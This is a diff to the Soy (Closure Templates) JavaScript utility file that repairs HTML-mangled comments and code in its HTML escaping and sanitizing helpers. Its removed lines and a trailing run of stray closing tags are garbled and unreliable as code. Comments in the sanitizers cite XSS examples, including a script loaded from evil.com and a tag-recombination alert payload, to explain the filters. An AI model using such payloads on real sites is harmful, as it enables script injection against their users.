@@ -21,11 +21,11 @@
  * <p>
  * The top portion of this file contains utilities for Soy users:<ul>
  *   <li> soy.StringBuilder: Compatible with the 'stringbuilder' code style.
- *   </li><li> soy.renderElement: Render template and set as innerHTML of an element.
- *   </li><li> soy.renderAsFragment: Render template and return as HTML fragment.
- * </li></ul>
+ *   <li> soy.renderElement: Render template and set as innerHTML of an element.
+ *   <li> soy.renderAsFragment: Render template and return as HTML fragment.
+ * </ul>
  *
- * </p><p>
+ * <p>
  * The bottom portion of this file contains utilities that should only be called
  * by Soy-generated JS code. Please do not use these functions directly from
  * your hand-writen code. Their names all start with '$$'.
@@ -531,7 +531,7 @@ soydata.VERY_UNSAFE.ordainSanitizedCss =
  * NOTE: New code should consider using goog.soy.renderElement instead.
  *
  * @param {Element} element The element whose content we are rendering.
- * @param {null|function(ARG_TYPES, null=, Object.<string, *="">=):*} template
+ * @param {null|function(ARG_TYPES, null=, Object.<string, *>=):*} template
  *     The Soy template defining the element's content.
  * @param {ARG_TYPES} opt_templateData The data for the template.
  * @param {Object=} opt_injectedData The injected data for the template.
@@ -550,7 +550,7 @@ soy.renderElement = goog.soy.renderElement;
  * NOTE: New code should consider using goog.soy.renderAsFragment
  * instead (note that the arguments are different).
  *
- * @param {null|function(ARG_TYPES, null=, Object.<string, *="">=):*} template
+ * @param {null|function(ARG_TYPES, null=, Object.<string, *>=):*} template
  *     The Soy template defining the element's content.
  * @param {ARG_TYPES} opt_templateData The data for the template.
  * @param {Document=} opt_document The document used to create DOM nodes. If not
@@ -575,7 +575,7 @@ soy.renderAsFragment = function(
  * NOTE: New code should consider using goog.soy.renderAsElement
  * instead (note that the arguments are different).
  *
- * @param {null|function(ARG_TYPES, null=, Object.<string, *="">=):*} template
+ * @param {null|function(ARG_TYPES, null=, Object.<string, *>=):*} template
  *     The Soy template defining the element's content.
  * @param {ARG_TYPES} opt_templateData The data for the template.
  * @param {Document=} opt_document The document used to create DOM nodes. If not
@@ -670,7 +670,7 @@ soy.$$getMapKeys = function(map) {
  *
  * <p> Important: This function must always be called with a string constant.
  *
- * </p><p> If Closure Compiler is not being used, then this is just this identity
+ * <p> If Closure Compiler is not being used, then this is just this identity
  * function. If Closure Compiler is being used, then each call to this function
  * will be replaced with a short string constant, which will be consistent per
  * input name.
@@ -775,9 +775,9 @@ soy.$$getDelegateFn = function(
  * Private helper soy.$$getDelegateFn(). This is the empty template function
  * that is returned whenever there's no delegate implementation found.
  *
- * @param {Object.<string, *="">=} opt_data
+ * @param {Object.<string, *>=} opt_data
  * @param {soy.StringBuilder=} opt_sb
- * @param {Object.<string, *="">=} opt_ijData
+ * @param {Object.<string, *>=} opt_ijData
  * @return {string}
  * @private
  */
@@ -974,7 +974,7 @@ soydata.VERY_UNSAFE.$$ordainSanitizedCssForInternalBlocks =
  * is preserved.
  *
  * This HTML-escapes the value unless it is already SanitizedHtml. Escapes
- * double quote '"' in addition to '&', '<', and="" '="">' so that a string can be
+ * double quote '"' in addition to '&', '<', and '>' so that a string can be
  * included in an HTML tag attribute value within double quotes.
  *
  * @param {*} value The value to convert. If it is already a SanitizedHtml
@@ -1013,10 +1013,10 @@ soy.$$cleanHtml = function(value) {
  * the body of a tag like {@code <textarea>} or {@code <title>}. RCDATA tags
  * cannot contain other HTML entities, so it is not strictly necessary to escape
  * HTML special characters except when part of that text looks like an HTML
- * entity or like a close tag : {@code </title></textarea>}.
- * </p><p>
+ * entity or like a close tag : {@code </textarea>}.
+ * <p>
  * Will normalize known safe HTML to make sure that sanitized HTML (which could
- * contain an innocuous {@code } don't prematurely end an RCDATA
+ * contain an innocuous {@code </textarea>} don't prematurely end an RCDATA
  * element.
  *
  * @param {*} value The string-like value to be escaped. May not be a string,
@@ -1039,7 +1039,18 @@ soy.$$escapeHtmlRcdata = function(value) {
  * @private
  */
 soy.$$HTML5_VOID_ELEMENTS_ = new RegExp(
-    '^<(?:area|base|br|col|command|embed|hr|img|input' +="" '|keygen|link|meta|param|source|track|wbr)\\b');="" **="" *="" removes="" html="" tags="" from="" a="" string="" of="" known="" safe="" html.="" if="" opt_tagwhitelist="" is="" not="" specified="" or="" empty,="" then="" the="" result="" can="" be="" used="" as="" an="" attribute="" value.="" @param="" {*}="" value="" to="" escaped.="" may="" string,="" but="" will="" coerced="" string.="" {object.<string,="" number="">=} opt_tagWhitelist Has an own property whose
+    '^<(?:area|base|br|col|command|embed|hr|img|input' +
+    '|keygen|link|meta|param|source|track|wbr)\\b');
+
+
+/**
+ * Removes HTML tags from a string of known safe HTML.
+ * If opt_tagWhitelist is not specified or is empty, then
+ * the result can be used as an attribute value.
+ *
+ * @param {*} value The HTML to be escaped. May not be a string, but the
+ *     value will be coerced to a string.
+ * @param {Object.<string, number>=} opt_tagWhitelist Has an own property whose
  *     name is a lower-case tag name and whose value is {@code 1} for
  *     each element that is allowed in the output.
  * @return {string} A representation of value without disallowed tags,
@@ -1052,7 +1063,7 @@ soy.$$stripHtmlTags = function(value, opt_tagWhitelist) {
         // This is just paranoia since callers should normalize the result
         // anyway, but if they didn't, it would be necessary to ensure that
         // after the first replace non-tag uses of < do not recombine into
-        // tags as in "<<foo>script>alert(1337)script>".
+        // tags as in "<<foo>script>alert(1337)</<foo>script>".
         .replace(soy.esc.$$LT_REGEX_, '&lt;');
   }
 
@@ -1060,7 +1071,9 @@ soy.$$stripHtmlTags = function(value, opt_tagWhitelist) {
   // have been removed.
   var html = String(value).replace(/\[/g, '&#91;');
 
-  // Consider all uses of '<' and="" replace="" whitelisted="" tags="" with="" markers="" like="" [1]="" which="" are="" indices="" into="" a="" list="" of="" approved="" tag="" names.="" all="" other="" uses="" <=""> with entities.
+  // Consider all uses of '<' and replace whitelisted tags with markers like
+  // [1] which are indices into a list of approved tag names.
+  // Replace all other uses of < and > with entities.
   var tags = [];
   html = html.replace(
     soy.esc.$$HTML_TAG_REGEX_,
@@ -1069,14 +1082,30 @@ soy.$$stripHtmlTags = function(value, opt_tagWhitelist) {
         tagName = tagName.toLowerCase();
         if (opt_tagWhitelist.hasOwnProperty(tagName) &&
             opt_tagWhitelist[tagName]) {
-          var start = tok.charAt(1) === '/' ? '</'>';
+          var start = tok.charAt(1) === '/' ? '</' : '<';
+          var index = tags.length;
+          tags[index] = start + tagName + '>';
           return '[' + index + ']';
         }
       }
       return '';
     });
 
-  // Escape HTML special characters. Now there are no '<' in="" html="" that="" could="" start="" a="" tag.="" var="" finalclosetags="soy.$$balanceTags_(tags);" now="" contains="" no="" tags="" or="" less-than="" characters="" become="" part="" of="" tag="" via="" replacement="" operation="" and="" only="" approved="" tags.="" reinsert="" the="" white-listed="" \[(\d+)\]="" g,="" function(_,="" index)="" {="" return="" tags[index];="" });="" close="" any="" still="" open this="" prevents="" unclosed="" formatting="" elements="" like="" <ol=""> and <table> from
+  // Escape HTML special characters. Now there are no '<' in html that could
+  // start a tag.
+  html = soy.esc.$$normalizeHtmlHelper(html);
+
+  var finalCloseTags = soy.$$balanceTags_(tags);
+
+  // Now html contains no tags or less-than characters that could become
+  // part of a tag via a replacement operation and tags only contains
+  // approved tags.
+  // Reinsert the white-listed tags.
+  html = html.replace(
+       /\[(\d+)\]/g, function(_, index) { return tags[index]; });
+
+  // Close any still open tags.
+  // This prevents unclosed formatting elements like <ol> and <table> from
   // breaking the layout of containing HTML.
   return html + finalCloseTags;
 };
@@ -1110,7 +1139,94 @@ soy.$$balanceTags_ = function(tags) {
         open.length = openTagIndex;
       }
     } else if (!soy.$$HTML5_VOID_ELEMENTS_.test(tag)) {
-      open.push('</string></table></'>Hello World
+      open.push('</' + tag.substring(1));
+    }
+  }
+  return open.reverse().join('');
+};
+
+
+/**
+ * Escapes HTML special characters in an HTML attribute value.
+ *
+ * @param {*} value The HTML to be escaped. May not be a string, but the
+ *     value will be coerced to a string.
+ * @return {string} An escaped version of value.
+ */
+soy.$$escapeHtmlAttribute = function(value) {
+  // NOTE: We don't accept ATTRIBUTES here because ATTRIBUTES is actually not
+  // the attribute value context, but instead k/v pairs.
+  if (soydata.isContentKind(value, soydata.SanitizedContentKind.HTML)) {
+    // NOTE: After removing tags, we also escape quotes ("normalize") so that
+    // the HTML can be embedded in attribute context.
+    goog.asserts.assert(value.constructor === soydata.SanitizedHtml);
+    return soy.esc.$$normalizeHtmlHelper(soy.$$stripHtmlTags(value.content));
+  }
+  return soy.esc.$$escapeHtmlHelper(value);
+};
+
+
+/**
+ * Escapes HTML special characters in a string including space and other
+ * characters that can end an unquoted HTML attribute value.
+ *
+ * @param {*} value The HTML to be escaped. May not be a string, but the
+ *     value will be coerced to a string.
+ * @return {string} An escaped version of value.
+ */
+soy.$$escapeHtmlAttributeNospace = function(value) {
+  if (soydata.isContentKind(value, soydata.SanitizedContentKind.HTML)) {
+    goog.asserts.assert(value.constructor === soydata.SanitizedHtml);
+    return soy.esc.$$normalizeHtmlNospaceHelper(
+        soy.$$stripHtmlTags(value.content));
+  }
+  return soy.esc.$$escapeHtmlNospaceHelper(value);
+};
+
+
+/**
+ * Filters out strings that cannot be a substring of a valid HTML attribute.
+ *
+ * Note the input is expected to be key=value pairs.
+ *
+ * @param {*} value The value to escape. May not be a string, but the value
+ *     will be coerced to a string.
+ * @return {string} A valid HTML attribute name part or name/value pair.
+ *     {@code "zSoyz"} if the input is invalid.
+ */
+soy.$$filterHtmlAttributes = function(value) {
+  // NOTE: Explicitly no support for SanitizedContentKind.HTML, since that is
+  // meaningless in this context, which is generally *between* html attributes.
+  if (soydata.isContentKind(value, soydata.SanitizedContentKind.ATTRIBUTES)) {
+    goog.asserts.assert(value.constructor === soydata.SanitizedHtmlAttribute);
+    // Add a space at the end to ensure this won't get merged into following
+    // attributes, unless the interpretation is unambiguous (ending with quotes
+    // or a space).
+    return value.content.replace(/([^"'\s])$/, '$1 ');
+  }
+  // TODO: Dynamically inserting attributes that aren't marked as trusted is
+  // probably unnecessary.  Any filtering done here will either be inadequate
+  // for security or not flexible enough.  Having clients use kind="attributes"
+  // in parameters seems like a wiser idea.
+  return soy.esc.$$filterHtmlAttributesHelper(value);
+};
+
+
+/**
+ * Filters out strings that cannot be a substring of a valid HTML element name.
+ *
+ * @param {*} value The value to escape. May not be a string, but the value
+ *     will be coerced to a string.
+ * @return {string} A valid HTML element name part.
+ *     {@code "zSoyz"} if the input is invalid.
+ */
+soy.$$filterHtmlElementName = function(value) {
+  // NOTE: We don't accept any SanitizedContent here. HTML indicates valid
+  // PCDATA, not tag names. A sloppy developer shouldn't be able to cause an
+  // exploit:
+  // ... {let userInput}script src=http://evil.com/evil.js{/let} ...
+  // ... {param tagName kind="html"}{$userInput}{/param} ...
+  // ... <{$tagName}>Hello World</{$tagName}>
   return soy.esc.$$filterHtmlElementNameHelper(value);
 };
 
@@ -1195,7 +1311,7 @@ soy.$$escapeJsRegex = function(value) {
 /**
  * Matches all URI mark characters that conflict with HTML attribute delimiters
  * or that cannot appear in a CSS uri.
- * From <a href="http://www.w3.org/TR/CSS2/grammar.html" target="_blank" rel="external">G.2: CSS grammar</a>
+ * From <a href="http://www.w3.org/TR/CSS2/grammar.html">G.2: CSS grammar</a>
  * <pre>
  *     url        ([!#$%&*-~]|{nonascii}|{escape})*
  * </pre>
@@ -1398,7 +1514,14 @@ soy.$$insertWordBreaks = function(value, maxCharsBetweenWordBreaks) {
 soy.$$truncate = function(str, maxLen, doAddEllipsis) {
 
   str = String(str);
-  if (str.length <= maxlen)="" {="" return="" str;="" no="" need="" to="" truncate="" }="" if="" doaddellipsis,="" either="" reduce="" maxlen="" compensate,="" or="" else="" is="" too="" small,="" just="" turn="" off="" doaddellipsis.="" (doaddellipsis)="" (maxlen=""> 3) {
+  if (str.length <= maxLen) {
+    return str;  // no need to truncate
+  }
+
+  // If doAddEllipsis, either reduce maxLen to compensate, or else if maxLen is
+  // too small, just turn off doAddEllipsis.
+  if (doAddEllipsis) {
+    if (maxLen > 3) {
       maxLen -= 3;
     } else {
       doAddEllipsis = false;
@@ -1429,7 +1552,28 @@ soy.$$truncate = function(str, maxLen, doAddEllipsis) {
  * @private
  */
 soy.$$isHighSurrogate_ = function(ch) {
-  return 0xD800 <= ch="" &&="" <="0xDBFF;" };="" **="" *="" private="" helper="" for="" $$truncate()="" to="" check="" whether="" a="" char="" is="" low="" surrogate.="" @param="" {string}="" the="" check.="" @return="" {boolean}="" given="" unicode="" @private="" soy.$$islowsurrogate_="function(ch)" {="" return="" 0xdc00="" -----------------------------------------------------------------------------="" bidi="" directives="" functions.="" cache="" of="" formatter="" by="" context="" directionality,="" so="" we="" don't="" keep="" on="" creating="" new="" objects.="" @type="" {!object.<!goog.i18n.bidiformatter="">}
+  return 0xD800 <= ch && ch <= 0xDBFF;
+};
+
+/**
+ * Private helper for $$truncate() to check whether a char is a low surrogate.
+ * @param {string} ch The char to check.
+ * @return {boolean} Whether the given char is a unicode low surrogate.
+ * @private
+ */
+soy.$$isLowSurrogate_ = function(ch) {
+  return 0xDC00 <= ch && ch <= 0xDFFF;
+};
+
+
+// -----------------------------------------------------------------------------
+// Bidi directives/functions.
+
+
+/**
+ * Cache of bidi formatter by context directionality, so we don't keep on
+ * creating new objects.
+ * @type {!Object.<!goog.i18n.BidiFormatter>}
  * @private
  */
 soy.$$bidiFormatterCache_ = {};
@@ -1653,7 +1797,7 @@ soy.esc.$$escapeUriHelper = function(v) {
 
 /**
  * Maps characters to the escaped versions for the named escape directives.
- * @type {Object.<string, string="">}
+ * @type {Object.<string, string>}
  * @private
  */
 soy.esc.$$ESCAPE_MAP_FOR_ESCAPE_HTML__AND__NORMALIZE_HTML__AND__ESCAPE_HTML_NOSPACE__AND__NORMALIZE_HTML_NOSPACE_ = {
@@ -1691,7 +1835,7 @@ soy.esc.$$REPLACER_FOR_ESCAPE_HTML__AND__NORMALIZE_HTML__AND__ESCAPE_HTML_NOSPAC
 
 /**
  * Maps characters to the escaped versions for the named escape directives.
- * @type {Object.<string, string="">}
+ * @type {Object.<string, string>}
  * @private
  */
 soy.esc.$$ESCAPE_MAP_FOR_ESCAPE_JS_STRING__AND__ESCAPE_JS_REGEX_ = {
@@ -1743,7 +1887,7 @@ soy.esc.$$REPLACER_FOR_ESCAPE_JS_STRING__AND__ESCAPE_JS_REGEX_ = function(ch) {
 
 /**
  * Maps characters to the escaped versions for the named escape directives.
- * @type {Object.<string, string="">}
+ * @type {Object.<string, string>}
  * @private
  */
 soy.esc.$$ESCAPE_MAP_FOR_ESCAPE_CSS_STRING_ = {
@@ -1788,7 +1932,7 @@ soy.esc.$$REPLACER_FOR_ESCAPE_CSS_STRING_ = function(ch) {
 
 /**
  * Maps characters to the escaped versions for the named escape directives.
- * @type {Object.<string, string="">}
+ * @type {Object.<string, string>}
  * @private
  */
 soy.esc.$$ESCAPE_MAP_FOR_NORMALIZE_URI__AND__FILTER_NORMALIZE_URI_ = {
@@ -2130,20 +2274,29 @@ soy.esc.$$filterHtmlElementNameHelper = function(value) {
 
 /**
  * Matches all tags, HTML comments, and DOCTYPEs in tag soup HTML.
- * By removing these, and replacing any '<' or="" '="">' characters with
+ * By removing these, and replacing any '<' or '>' characters with
  * entities we guarantee that the result can be embedded into a
  * an attribute without introducing a tag boundary.
  *
  * @type {RegExp}
  * @private
  */
-soy.esc.$$HTML_TAG_REGEX_ = /<(?:!|\ ?([a-za-z][a-za-z0-9:\-]*))(?:[^="">'"]|"[^"]*"|'[^']*')*>/g;
+soy.esc.$$HTML_TAG_REGEX_ = /<(?:!|\/?([a-zA-Z][a-zA-Z0-9:\-]*))(?:[^>'"]|"[^"]*"|'[^']*')*>/g;
 
 /**
- * Matches all occurrences of '<'. *="" @type="" {regexp}="" @private="" soy.esc.$$lt_regex_="/</g;" **="" maps="" lower-case="" names="" of="" innocuous="" tags="" to="" 1.="" {object.<string,number="">}
+ * Matches all occurrences of '<'.
+ *
+ * @type {RegExp}
+ * @private
+ */
+soy.esc.$$LT_REGEX_ = /</g;
+
+/**
+ * Maps lower-case names of innocuous tags to 1.
+ *
+ * @type {Object.<string,number>}
  * @private
  */
 soy.esc.$$SAFE_TAG_WHITELIST_ = {'b': 1, 'br': 1, 'em': 1, 'i': 1, 's': 1, 'sub': 1, 'sup': 1, 'u': 1};
 
 // END GENERATED CODE
-</'.></(?:!|\></'></string,></string,></string,></string,></span></=></=></foo></(?:area|base|br|col|command|embed|hr|img|input'></p></',></string,></string,></p></string></string,></string,></string,></b></b></p>
